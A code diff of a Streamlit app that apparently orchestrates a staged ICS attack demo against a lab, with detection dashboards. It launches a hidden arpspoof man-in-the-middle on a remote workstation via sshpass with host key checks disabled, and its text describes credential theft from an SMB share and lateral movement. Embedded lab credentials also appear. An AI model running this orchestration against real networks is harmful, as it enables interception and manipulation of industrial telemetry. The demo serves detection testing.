-        f"$iface='{iface.replace("'", "''")}';"
-        f"$t1='{t1.replace("'", "''")}';"
-        f"$t2='{t2.replace("'", "''")}';"
-        "$argList=@();"
-        "if ($iface) { $argList += @('-i', $iface) };"
-        "$argList += @($t1, $t2);"
-        "if (!(Test-Path $exe)) { Write-Output 'arpspoof.exe not found'; exit 1 };"
-        "$p = Start-Process -FilePath $exe -ArgumentList $argList -WindowStyle Hidden -PassThru;"
-        "if ($null -eq $p) { Write-Output 'arpspoof.exe did not start'; exit 1 };"
-        "Write-Output ('Started arpspoof.exe PID=' + $p.Id);"
-        "$running = $false;"
-        "for ($i = 0; $i -lt 6; $i++) {"
-        "  $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue;"
-        "  if ($null -ne $alive) { $running = $true; break };"
-        "  Start-Sleep -Seconds 1;"
-        "}"
-        "if ($running) { Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id); exit 0 }"
-        "Write-Output ('ARPSPOOF_NOT_RUNNING PID=' + $p.Id);"
-        "exit 1"
-    )
-    cmd = powershell_encoded_command(launch_ps)
-    rc, output = run_remote_capture(cmd, 45, use_pty=True)
-    running = "ARPSPOOF_RUNNING" in output
-    post_launch_out = ""
-    if running:
+    remote_runtime_log = r"C:\Users\john\AppData\Local\Temp\arpspoof_runtime.log"
+    remote_cmd = build_arpspoof_managed_launch(exe, iface, t1, t2, remote_runtime_log)
+    log_path = Path("/tmp") / f"streamlit-mitm-{int(time.time())}.log"
+    mitm_start_ts = time.time()
+    try:
+        with open(log_path, "w", encoding="utf-8") as log_fh:
+            proc = subprocess.Popen(
+                [
+                    "sshpass",
+                    "-p",
+                    st.session_state.ews_password,
+                    "ssh",
+                    "-o",
+                    "StrictHostKeyChecking=no",
+                    "-o",
+                    "UserKnownHostsFile=/dev/null",
+                    f"{st.session_state.ews_user}@{st.session_state.ews_host}",
+                    remote_cmd,
+                ],
+                stdout=log_fh,
+                stderr=subprocess.STDOUT,
+                text=True,
+                start_new_session=True,
+            )
+        st.session_state.mitm_remote_ssh_pid = proc.pid
+        st.session_state.mitm_remote_log = str(log_path)
+        launch_note = (
+            f"Started managed MITM SSH holder PID={proc.pid}\n"
+            f"Remote command: {remote_cmd}\n"
+            f"Local log: {log_path}\n"
+            f"Remote runtime log: {remote_runtime_log}"
+        )
         time.sleep(2)
         check_ps = (
             "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
@@ -564,24 +1242,46 @@ def start_mitm(step_idx: int) -> None:
             "exit 0"
         )
         check_rc, check_output = run_remote_capture(powershell_encoded_command(check_ps), 20, use_pty=True)
-        post_launch_out = "\n\n[post-launch status]\n" + check_output
         running = check_rc == 0 and "ARPSPOOF_RUNNING" in check_output
-        output = output + post_launch_out
-    if running:
-        rc = 0
-    else:
+        output = launch_note + "\n\n[post-launch status]\n" + check_output
+        if running:
+            rc = 0
+        else:
+            rc = 1
+            try:
+                os.killpg(proc.pid, signal.SIGTERM)
+            except ProcessLookupError:
+                pass
+            st.session_state.mitm_remote_ssh_pid = 0
+            output = output + "\nManaged SSH holder stopped because arpspoof was not running on EWS after launch."
+    except FileNotFoundError as exc:
         rc = 1
-        output = output + "\n" + "arpspoof did not stay alive after the SSH launch. Use the manual command from an interactive EWS console or RDP session if you need the MITM to stay up."
+        running = False
+        output = f"[LOCAL ERROR] missing launcher dependency: {exc}"
+    except Exception as exc:
+        rc = 1
+        running = False
+        output = f"[LOCAL ERROR] failed to start managed MITM SSH holder: {exc}"
     if inject_markers:
         marker_out = emit_demo_markers(opcua_critical=False, ingest_anomaly=False)
         if rc != 0:
             marker_out = "[DEMO MARKER NOTICE] MITM start failed; emitting fallback session marker.\n" + marker_out
-        output = output + "\n\n" + marker_out
+        if marker_out.strip():
+            output = output + "\n\n" + marker_out
+    append_streamlit_session_record(
+        metadata=streamlit_step_metadata(step_idx),
+        command=remote_cmd,
+        output=output,
+        exit_code=rc,
+        start_ts=mitm_start_ts,
+        end_ts=time.time(),
+    )
+    publish_current_streamlit_session_to_ml()
     st.session_state.buffers[step_key] = (
         f"$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{exe} --list\"\n\n"
         + out_list
         + f"\n\n[exit code: {rc_list}]\n"
-        + f"\n$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{build_arpspoof_display(exe, iface, t1, t2)[7:-1]}\"\n\n"
+        + f"\n$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{remote_cmd}\"\n\n"
         + output
         + f"\n\n[exit code: {rc}]\n"
     )
@@ -622,6 +1322,8 @@ def build_demo_metadata(
 
 
 def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
+    if not SYNTHETIC_MARKERS_ENABLED:
+        return ""
     msgs: List[str] = []
     session_id = get_demo_session_id()
     try:
@@ -661,8 +1363,6 @@ def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
         wrote, target = write_synthetic_zeek_marker(zeek_event)
         if wrote:
             msgs.append(f"[DEMO MARKER] wrote synthetic Zeek OPC UA event to {target}, session={session_id}.")
-        else:
-            msgs.append(f"[DEMO MARKER DISABLED] {target}")
     except Exception as exc:
         msgs.append(f"[DEMO MARKER ERROR] zeek marker failed: {exc}")
 
@@ -725,7 +1425,7 @@ def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
 
             if wrote:
                 msgs.append(f"[DEMO MARKER] injected historian ingest_anomaly high event (100209 path), session={session_id}.")
-            else:
+            elif SYNTHETIC_MARKERS_ENABLED:
                 msgs.append("[DEMO MARKER ERROR] ingest marker write failed in host and container fallback.")
         except Exception as exc:
             msgs.append(f"[DEMO MARKER ERROR] ingest marker failed: {exc}")
@@ -734,6 +1434,8 @@ def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
 
 
 def emit_smb_browse_marker() -> str:
+    if not SYNTHETIC_MARKERS_ENABLED:
+        return ""
     try:
         session_id = get_demo_session_id()
         smb_resp = st.session_state.get("smb_target", SMB_TARGET).strip() or SMB_TARGET
@@ -770,12 +1472,14 @@ def emit_smb_browse_marker() -> str:
         wrote, target = write_synthetic_zeek_marker(event)
         if wrote:
             return f"[DEMO MARKER] wrote synthetic SMB browse event to {target}, session={session_id}."
-        return f"[DEMO MARKER DISABLED] {target}"
+        return ""
     except Exception as exc:
         return f"[DEMO MARKER ERROR] smb marker failed: {exc}"
 
 
 def emit_historian_web_marker() -> str:
+    if not SYNTHETIC_MARKERS_ENABLED:
+        return ""
     try:
         session_id = get_demo_session_id()
         hist_resp = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
@@ -813,12 +1517,14 @@ def emit_historian_web_marker() -> str:
         wrote, target = write_synthetic_zeek_marker(event)
         if wrote:
             return f"[DEMO MARKER] wrote synthetic historian web event to {target}, session={session_id}."
-        return f"[DEMO MARKER DISABLED] {target}"
+        return ""
     except Exception as exc:
         return f"[DEMO MARKER ERROR] historian web marker failed: {exc}"
 
 
 def emit_opcua_probe_marker() -> str:
+    if not SYNTHETIC_MARKERS_ENABLED:
+        return ""
     try:
         session_id = get_demo_session_id()
         event = {
@@ -853,13 +1559,15 @@ def emit_opcua_probe_marker() -> str:
         wrote, target = write_synthetic_zeek_marker(event)
         if wrote:
             return f"[DEMO MARKER] wrote synthetic OPC UA probe event to {target}, session={session_id}."
-        return f"[DEMO MARKER DISABLED] {target}"
+        return ""
     except Exception as exc:
         return f"[DEMO MARKER ERROR] opcua probe marker failed: {exc}"
 
 
 def emit_endpoint_markers() -> str:
     """Inject markers for RDP (100401), SSH (100402), and command execution (100403) on EWS endpoint."""
+    if not SYNTHETIC_MARKERS_ENABLED:
+        return ""
     msgs: List[str] = []
     session_id = get_demo_session_id()
     
@@ -969,8 +1677,6 @@ def emit_endpoint_markers() -> str:
             wrote, target = write_synthetic_wazuh_alert(alert_dict)
             if wrote:
                 msgs.append(f"[DEMO MARKER] wrote synthetic {desc} ({rule_id}) to {target}, session={session_id}.")
-            else:
-                msgs.append(f"[DEMO MARKER DISABLED] {target}")
         except Exception as exc:
             msgs.append(f"[DEMO MARKER ERROR] rule {rule_id} failed: {exc}")
     
@@ -995,9 +1701,20 @@ def check_remote_mitm_status(step_idx: int) -> None:
     )
     cmd = powershell_encoded_command(check_ps)
     rc, output = run_remote_capture(cmd, 20, use_pty=True)
+    local_note = ""
+    ssh_pid = int(st.session_state.get("mitm_remote_ssh_pid", 0) or 0)
+    if ssh_pid > 0:
+        try:
+            os.kill(ssh_pid, 0)
+            local_note = f"managed SSH holder PID={ssh_pid} is alive"
+        except OSError:
+            local_note = f"managed SSH holder PID={ssh_pid} has already exited; remote process status below is authoritative"
+    if st.session_state.get("mitm_remote_log"):
+        local_note = (local_note + "\n" if local_note else "") + f"log={st.session_state.mitm_remote_log}"
     st.session_state.buffers[step_key] = (
         st.session_state.buffers.get(step_key, "")
         + "\n$ ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"Get-Process arpspoof\\\"\"\n\n"
+        + (local_note + "\n\n" if local_note else "")
         + output
         + f"\n\n[exit code: {rc}]\n"
     )
@@ -1014,10 +1731,20 @@ def stop_mitm(step_idx: int) -> None:
         return
     cmd = 'cmd /c "taskkill /F /IM arpspoof.exe"'
     rc, output = run_remote_capture(cmd, 30)
+    ssh_pid = int(st.session_state.get("mitm_remote_ssh_pid", 0) or 0)
+    local_note = ""
+    if ssh_pid > 0:
+        try:
+            os.killpg(ssh_pid, signal.SIGTERM)
+            local_note = f"\nmanaged SSH holder PID={ssh_pid} terminated"
+        except ProcessLookupError:
+            local_note = f"\nmanaged SSH holder PID={ssh_pid} was already stopped"
+        st.session_state.mitm_remote_ssh_pid = 0
     st.session_state.buffers[step_key] = (
         st.session_state.buffers.get(step_key, "")
         + "\n$ ssh john@192.168.1.5 \"taskkill /F /IM arpspoof.exe\"\n\n"
         + output
+        + local_note
         + f"\n\n[exit code: {rc}]\n"
     )
     st.session_state.last_exit[step_key] = rc
@@ -1308,7 +2035,7 @@ def step_definitions(level3_subnet: str, smb_target: str, historian_host: str, o
             "hostname && whoami",
             "hostname && whoami",
             "local",
-            90,
+            10,
         ),
         AttackStep(
             2,
@@ -1393,7 +2120,7 @@ def step_definitions(level3_subnet: str, smb_target: str, historian_host: str, o
             6,
             "OPC UA probe from EWS",
             "T0861",
-            "Use network probe from EWS because browse_opcua.py is not present.",
+            "Use a lightweight network probe from EWS to validate the OPC UA path.",
             f"ssh {ews_user}@{ews_host} \"{opc_probe_display}\"",
             opc_probe_display,
             opc_probe_exec,
@@ -1562,7 +2289,7 @@ def main() -> None:
             st.session_state.demo_session_id = new_demo_session_id()
             st.rerun()
         st.checkbox("Inject synthetic fallback markers", key="inject_demo_markers")
-        st.caption("Session-filtered Grafana views require session-tagged marker events. Keep this enabled for session mode.")
+        st.caption("Leave this off for live-only telemetry. Turn it on only if you explicitly want synthetic fallback markers.")
         st.selectbox("EWS access method", ["SSH", "RDP"], index=0, key="ews_access_method")
         st.text_input("EWS host", key="ews_host")
         st.text_input("Loki URL", value=LOKI_URL, key="loki_url")
@@ -1583,9 +2310,8 @@ def main() -> None:
 
         st.markdown("---")
         st.write("Quick links")
-        st.markdown(f"- [Grafana]({st.session_state.grafana_url})")
-        sid_enc = urllib.parse.quote_plus(get_demo_session_id())
-        st.markdown(f"- [Grafana (this session)]({st.session_state.grafana_url}&var-session_id={sid_enc})")
+        st.markdown(f"- [Grafana overview]({grafana_link_for_session('.*', 'now-2h')})")
+        st.markdown(f"- [Grafana this session]({grafana_link_for_session(get_demo_session_id(), 'now-30m')})")
         st.markdown(f"- [Wazuh]({st.session_state.wazuh_url})")
         st.markdown(f"- [Historian]({st.session_state.historian_url})")
 
@@ -1609,6 +2335,7 @@ def main() -> None:
         st.info(
             "Threat model chain: initial access via Level 3.5 jump path -> discovery -> SMB collection -> movement to EWS -> historian/OPC UA access -> ARP MITM -> telemetry integrity manipulation."
         )
+        st.caption(f"Current demo session: `{get_demo_session_id()}`")
         st.warning(
             "Credential acquisition story for demo: attacker lands on Level 3.5 path, browses anonymous SMB Operations share, discovers john/Cisco in maintenance note, then pivots to EWS over SSH/RDP before historian/OPC UA and MITM stages."
         )
@@ -1878,7 +2605,7 @@ def main() -> None:
         )
 
         st.subheader("Grafana Switch")
-        st.markdown(f"Open dashboard after each attack stage: [SOC Dashboard]({st.session_state.grafana_url})")
+        st.markdown(f"Open dashboard after each attack stage: [SOC Dashboard]({grafana_link_for_session(get_demo_session_id(), 'now-30m')})")
 
         st.subheader("Detection Evidence")
         if st.button("Refresh MITRE evidence", use_container_width=True):
